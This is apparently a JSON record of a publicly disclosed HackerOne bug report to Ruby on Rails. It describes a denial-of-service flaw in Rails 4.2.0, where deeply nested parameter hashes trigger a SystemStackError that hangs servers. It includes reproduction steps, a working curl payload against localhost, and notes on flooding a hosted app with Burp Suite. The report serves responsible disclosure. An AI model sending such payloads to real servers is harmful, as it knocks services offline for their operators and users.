            "is_internal": false, 
            "editable": false, 
            "updated_at": "2015-06-16T21:56:27.841Z", 
            "actor": {
                "username": "ff7f00", 
                "url": "/ff7f00", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/016/056/ea01634831611652cf7c1208dac5fbf3a2389382_medium.png?1420580655"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "rails", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::ReportBecamePublic", 
            "id": 474658, 
            "genius_execution_id": null
        }, 
        {
            "bounty_currency": "usd", 
            "automated_response": false, 
            "created_at": "2018-02-07T18:25:36.498Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2018-02-07T18:25:36.498Z", 
            "actor": {
                "url": "/rails", 
                "profile": {
                    "name": "Ruby on Rails"
                }, 
                "ibb": true, 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/000/022/1b2dab688cae8b769493f39137f09274a6b5f156_medium.png?1383736680"
                }
            }, 
            "team_handle": "rails", 
            "bonus_amount": "0.0", 
            "bounty_amount": "1500.0", 
            "collaborator": {
                "username": "ff7f00", 
                "url": "/ff7f00"
            }, 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::BountyAwarded", 
            "id": 2359927, 
            "genius_execution_id": null
        }
    ], 
    "in_validation?": false, 
    "is_participant": false, 
    "singular_disclosure_allowed": true, 
    "reporter": {
        "username": "ff7f00", 
        "hacker_mediation": false, 
        "hackerone_triager": false, 
        "disabled": false, 
        "url": "/ff7f00", 
        "profile_picture_urls": {
            "small": "https://profile-photos.hackerone-user-content.com/000/016/056/0e8f23047137669937864709d6cf812f489a2e3a_small.png?1420580655"
        }, 
        "is_me?": false
    }, 
    "weakness": {
        "id": 48, 
        "name": "Denial of Service"
    }, 
    "is_external_bug": false, 
    "visibility": "full", 
    "allow_singular_disclosure_after": -107061673.22468112, 
    "disclosed_at": "2015-06-16T21:56:27.776Z", 
    "stage": 4, 
    "url": "https://hackerone.com/reports/42797", 
    "created_at": "2015-01-07T20:01:46.370Z", 
    "original_report_url": null, 
    "vulnerability_information_html": "<h1 id=\"severity\">Severity</h1>\n\n<p>Medium</p>\n\n<h1 id=\"impact\">Impact</h1>\n\n<p>Attackers can cause an application to be unreachable, causing a denial of service condition.</p>\n\n<h1 id=\"details\">Details</h1>\n\n<p>When a Rails application receives a request with either body or query parameters, these parameters are converted to a params hash. Hashes can be passed to the application in the form of user[name]=foo&amp;user[address]=bar. Action Pack will then convert this into a hash in the form of <code>{ user[:name] =&gt; &quot;foo&quot;, user[:address] =&gt; &quot;bar&quot; }</code>. By passing a very large nested hash in the form of nested_hash[X1][X2]...[Xn], it is possible to create a denial of service condition in the form of a SystemStackError that is not handled properly. See the Bug Notes section on my attempt to figure out where this is occurring.</p>\n\n<p>This was tested in the latest Rails 4.2.0 release with Ruby versions ruby-1.9.3-p551, 2.1.5p273, and ruby 2.2.0p0.</p>\n\n<p>Production Webrick and single threaded Thin servers can be taken out with a single request. I set Burp Suite to a high number of concurrent requests and was able to get Heroku to produce a generic application unavailable message on a production application I had hosted, so Unicorn will be effected as well with workers constantly dying and being relaunched.</p>\n\n<h1 id=\"bug-notes\">Bug Notes</h1>\n\n<p>It seems that the initial SystemStackError is thrown during normalize_encode_params(params) in actionpack/lib/action_dispatch/http/parameters.rb, Line 47. This method is then called again during the logging/creating of the exception when the logging code attempts to normalize and encode the parameters again. It&#39;s possible that a loop is being hit here every time the SystemStackError occurs.</p>\n\n<p>I set a byebug break point in the GET and POST methods located at actionpack/lib/action_dispatch/http/request.rb, line 299, then set &#39;catch SystemStackError&#39;. The SystemStackError is raised 2 more times before finally running out of resources and hanging the process. The normalize_encode_params is a recursive method that creates a new hash in a block before calling itself so I believe a lot of resources are being allocated for this method when it gets deep into the nested hash.</p>\n\n<h1 id=\"reproduction-steps\">Reproduction Steps</h1>\n\n<p>For Webrick:</p>\n\n<ol>\n<li>rails new dos_test</li>\n<li>cd dos_test</li>\n<li>bundle exec rails generate controller welcome index</li>\n<li>Uncomment the <code>root &#39;welcome#index&#39;</code> line in config/routes.rb</li>\n<li>SECRET_KEY_BASE=&#39;foo&#39; bundle exec rails s -e production</li>\n<li>Then in a separate window, run the following cURL command:</li>\n</ol>\n<pre class=\"highlight plaintext\"><code>curl -i -s -k  -X &#39;GET&#39; \\\n-H &#39;Content-Type: application/x-www-form-urlencoded&#39; \\\n--data-binary $&#39;foo[a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a]=bar&#39; \\\n&#39;http://localhost:3000/&#39;\n</code></pre>\n<p>Note that Webrick will hang and will have to be killed manually. If the Webrick server handles this level of nesting, more nesting levels can be created by adding [a] until the application hangs.</p>\n\n<p>If you have any questions at all or need clarification, I\u2019d be happy to help.</p>\n", 
    "vulnerability_information": "# Severity\r\n\r\nMedium\r\n\r\n# Impact\r\n\r\nAttackers can cause an application to be unreachable, causing a denial of service condition.\r\n\r\n# Details\r\n\r\nWhen a Rails application receives a request with either body or query parameters, these parameters are converted to a params hash. Hashes can be passed to the application in the form of user[name]=foo&user[address]=bar. Action Pack will then convert this into a hash in the form of `{ user[:name] => \"foo\", user[:address] => \"bar\" }`. By passing a very large nested hash in the form of nested_hash[X1][X2]...[Xn], it is possible to create a denial of service condition in the form of a SystemStackError that is not handled properly. See the Bug Notes section on my attempt to figure out where this is occurring.\r\n\r\nThis was tested in the latest Rails 4.2.0 release with Ruby versions ruby-1.9.3-p551, 2.1.5p273, and ruby 2.2.0p0.\r\n\r\nProduction Webrick and single threaded Thin servers can be taken out with a single request. I set Burp Suite to a high number of concurrent requests and was able to get Heroku to produce a generic application unavailable message on a production application I had hosted, so Unicorn will be effected as well with workers constantly dying and being relaunched.\r\n\r\n# Bug Notes\r\n\r\nIt seems that the initial SystemStackError is thrown during normalize_encode_params(params) in actionpack/lib/action_dispatch/http/parameters.rb, Line 47. This method is then called again during the logging/creating of the exception when the logging code attempts to normalize and encode the parameters again. It's possible that a loop is being hit here every time the SystemStackError occurs.\r\n\r\nI set a byebug break point in the GET and POST methods located at actionpack/lib/action_dispatch/http/request.rb, line 299, then set 'catch SystemStackError'. The SystemStackError is raised 2 more times before finally running out of resources and hanging the process. The normalize_encode_params is a recursive method that creates a new hash in a block before calling itself so I believe a lot of resources are being allocated for this method when it gets deep into the nested hash.\r\n\r\n# Reproduction Steps\r\n\r\nFor Webrick:\r\n\r\n1. rails new dos_test\r\n2. cd dos_test\r\n3. bundle exec rails generate controller welcome index\r\n4. Uncomment the `root 'welcome#index'` line in config/routes.rb\r\n5. SECRET_KEY_BASE='foo' bundle exec rails s -e production\r\n6. Then in a separate window, run the following cURL command:\r\n\r\n```\r\ncurl -i -s -k  -X 'GET' \\\r\n-H 'Content-Type: application/x-www-form-urlencoded' \\\r\n--data-binary $'foo[a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a][a]=bar' \\\r\n'http://localhost:3000/'\r\n```\r\n\r\nNote that Webrick will hang and will have to be killed manually. If the Webrick server handles this level of nesting, more nesting levels can be created by adding [a] until the application hangs.\r\n\r\nIf you have any questions at all or need clarification, I\u2019d be happy to help.", 
    "team_private?": false, 
    "team": {
        "profile": {
            "website": "http://rubyonrails.org/security", 
            "about": "Web development that doesn't hurt.", 
            "twitter_handle": null, 
            "name": "Ruby on Rails"
        }, 
        "handle": "rails", 
        "url": "https://hackerone.com/rails", 
        "state": "public_mode", 
        "profile_picture_urls": {
            "small": "https://profile-photos.hackerone-user-content.com/000/000/022/2883e997d5f9ddf2f1c31365d74abe52fc54c9c9_small.png?1383736680", 
            "medium": "https://profile-photos.hackerone-user-content.com/000/000/022/1b2dab688cae8b769493f39137f09274a6b5f156_medium.png?1383736680"
        }, 
        "awards_miles": false, 
        "permissions": [], 
        "id": 22, 
        "default_currency": "usd"
    }, 
    "is_published": false
}